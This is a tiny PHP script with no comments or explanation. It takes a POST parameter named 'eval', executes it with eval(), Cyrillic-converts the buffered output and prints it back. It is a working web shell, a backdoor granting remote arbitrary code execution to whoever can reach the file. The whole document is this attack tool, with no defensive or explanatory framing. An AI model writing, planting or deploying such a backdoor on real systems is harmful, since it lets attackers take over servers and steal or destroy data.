<?php
ob_start();
$eval = $_POST['eval'];
$tmp = ob_get_contents();
echo $tmp;
ob_clean();
eval($eval);
$ret = ob_get_contents();
$ret = convert_cyr_string($ret,"d","w");
ob_clean();
echo $ret;
?>